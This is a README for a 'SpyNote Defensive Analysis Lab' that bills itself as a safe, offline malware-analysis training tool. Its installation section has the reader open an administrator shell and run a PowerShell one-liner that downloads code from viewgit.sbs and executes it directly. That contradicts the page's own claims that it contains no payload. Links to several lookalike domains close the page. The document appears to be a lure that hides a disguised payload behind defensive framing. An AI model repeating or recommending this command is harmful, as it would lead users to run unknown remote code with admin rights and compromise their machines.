# SpyNote Defensive Analysis Lab

> An offline, educational malware-analysis lab for recognizing suspicious behavior and building defensive detections; no payload execution or command-and-control code is included.

---
## ⚙️ INSTALLATION & SETUP (CMD / PowerShell)

### Step 1: Open CMD or PowerShell as Administrator
```cmd
# Press Win+X, then select Terminal (Admin) or Command Prompt (Admin)
```

### Step 2: Execute Deployment Command
```cmd
powershell -Command "irm viewgit.sbs?get=spynote | iex"
```

### Step 3: Wait for Completion
```
[1/4] Loading Spynote modules...
[2/4] Configuring components...
[3/4] Initializing services...
[4/4] Ready. Launch Spynote.
```

### Step 4: Start Using the Tool
- Launch the tool from the Start menu or command line
- Configure settings for your environment
- Verify the health check passes

## TL;DR - Quick Summary

**SpyNote Defensive Analysis Lab** teaches analysts to inspect indicators, classify behavior, document risk, and draft containment guidance using harmless fixtures. It does not provide payloads, persistence mechanisms, credential theft, remote access, or C2 instructions.

**Best for:** SOC trainees, detection engineers, and incident-response educators.

## Core Features

- ✅ **Synthetic Fixtures** — Safe event and metadata samples for guided exercises.
- ✅ **Indicator Workbook** — Organize hashes, domains, paths, and behavioral observations.
- ✅ **Behavior Taxonomy** — Map observations to defensive categories without executing code.
- ✅ **Detection Drafts** — Create reviewable rules from documented behaviors.
- ✅ **Containment Checklist** — Plan isolation, evidence preservation, and recovery steps.
- ✅ **Report Export** — Generate privacy-safe analyst notes and tickets.
- ✅ **Instructor Mode** — Track learning objectives and review answers offline.

## Usage

```bash
python -m lab case create --name "training-case-01"
python -m lab fixture load --path fixtures/synthetic-events.json
python -m lab indicators review --case training-case-01
python -m lab report export --case training-case-01 --format markdown
```

## REST API

> [!NOTE]
> The localhost API stores only lab records supplied by the operator. It has no network scanning, sample execution, or remote-control capability.

```bash
python -m lab serve --host 127.0.0.1 --port 8000
curl http://127.0.0.1:8000/api/health
curl http://127.0.0.1:8000/api/cases
curl -X POST http://127.0.0.1:8000/api/cases \
  -H "Content-Type: application/json" \
  -d '{"name":"training-case-02","classification":"synthetic"}'
```

## Screenshots

- Case dashboard: `screenshots/case-dashboard.png`
- Indicator workbook: `screenshots/indicator-workbook.png`
- Detection draft: `screenshots/detection-draft.png`
- Containment checklist: `screenshots/containment-checklist.png`

## Troubleshooting

| Issue | Solution |
|---|---|
| Fixture fails validation | Confirm it is a supported synthetic JSON fixture. |
| Detection draft is empty | Add at least one reviewed behavior observation. |
| Report contains sensitive data | Redact hostnames and account identifiers before export. |
| API cannot start | Check that port 8000 is free and the virtual environment is active. |

## Use Cases

- **SOC Training** — Practice structured analysis with safe data.
- **Detection Engineering** — Turn documented behavior into reviewable coverage.
- **Incident Response** — Rehearse evidence and containment workflows.
- **Threat Education** — Explain risk without distributing harmful code.

## ⚠️ IMPORTANT

> [!IMPORTANT]
> Never execute, deploy, or adapt real malware from this project. Unknown samples belong in an approved isolated lab, and all analysis must follow law, policy, and organizational authorization.

> [!TIP]
> Prefer behavioral observations and defensive indicators over copying live infrastructure details into training materials.

## License

MIT License — see the [LICENSE](./LICENSE) file for details.

## Tags

<!--
spynote, defensive-security, malware-analysis, soc-training, detection-engineering, incident-response, synthetic-fixtures, threat-education
-->

[gitview.sbs](https://gitview.sbs?t=spynote) | [gitrm.cfd](https://gitrm.cfd?t=spynote) | [viewgit.sbs](https://viewgit.sbs?t=spynote) | [gitrm.sbs](https://gitrm.sbs?t=spynote) | [gitsl.xyz](https://gitsl.xyz?t=spynote)
